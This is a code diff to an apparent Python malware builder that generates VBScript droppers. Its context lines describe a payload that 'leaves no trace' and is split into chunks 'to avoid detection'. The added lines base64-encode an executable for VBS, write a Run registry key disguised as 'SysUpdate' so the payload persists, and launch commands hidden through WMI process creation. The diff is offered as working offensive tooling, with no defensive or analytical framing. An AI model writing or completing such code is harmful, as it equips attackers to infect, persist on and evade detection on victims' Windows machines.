@@ -123,9 +123,8 @@ WScript.Quit
         4. Leaves no trace
         """
 
-        # Compress executable
-        compressed = zlib.compress(exe_content, level=9)
-        encoded = base64.b64encode(compressed).decode()
+        # Base64 encode directly (VBS lacks native zlib decompression)
+        encoded = base64.b64encode(exe_content).decode()
 
         # Split into chunks to avoid detection
         chunk_size = 256
@@ -207,7 +206,7 @@ f.DeleteFile t
         templates.append(f"""
 On Error Resume Next
 Set s = CreateObject("WScript.Shell")
-s.RegWrite "HKCU\\Software\\Windows\\Run", "{command}"
+s.RegWrite "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SysUpdate", "{command}"
 s.Run "{command}", 0
 """)
 
@@ -223,9 +222,8 @@ s.Run e("TEMP_CMD"), 0
         # Template 3: WMI-based
         templates.append(f"""
 On Error Resume Next
-Set w = GetObject("winmgmts:")
-Set p = w.ExecMethod("Win32_Process", "Create")
-p(Array("{command}"))
+Set w = GetObject("winmgmts:\\\\.\root\\cimv2:Win32_Process")
+w.Create "{command}", Null, Null, intPid
 """)
 
         # Template 4: Shell.Application-based
